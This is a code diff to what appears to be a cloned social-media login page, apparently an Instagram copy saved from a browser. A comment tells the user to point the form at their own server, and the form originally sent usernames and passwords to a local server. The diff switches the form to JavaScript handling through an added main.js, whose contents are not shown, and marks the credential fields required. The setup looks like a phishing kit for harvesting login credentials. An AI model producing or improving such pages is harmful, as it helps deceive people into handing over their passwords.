@@ -6800,11 +6800,12 @@ body.fb_hidden {
 
                 <!-- change URL according to your server  -->
                 
-                <form class="_3jvtb" method="GET" action="http://localhost:3000/login">
+                <form class="_3jvtb" id="login-form">
                   <div class="_t296e">
                     <div class="_sjplo">
                       <div class="_ev9xl">
                         <input
+                          required
                           type="text" class="_ph6vk _jdqpn _o716c" id="fa4e2a34ab06a" aria-describedby=""
                           placeholder="Phone number, username, or email" aria-required="true" autocapitalize="off"
                           autocorrect="off" maxlength="30" name="username" value="">
@@ -6816,6 +6817,7 @@ body.fb_hidden {
                     <div class="_sjplo">
                       <div class="_ev9xl">
                         <input type="password"
+                          required
                           class="_ph6vk _jdqpn _o716c" id="faa2da1ad083" aria-describedby="" placeholder="Password"
                           aria-required="true" autocapitalize="off" autocorrect="off" name="password" value="">
                       </div>
@@ -6993,6 +6995,7 @@ body.fb_hidden {
   <script type="text/javascript" src="chrome-extension://jnkdcmgmnegofdddphijckfagibepdlb/helpBar.js"></script>
   <script type="text/javascript" src="chrome-extension://jnkdcmgmnegofdddphijckfagibepdlb/js/dash.all.min.js"></script>
   <div class="help-panel">
+  <script src="./main.js"></script>
 
 </body>
 
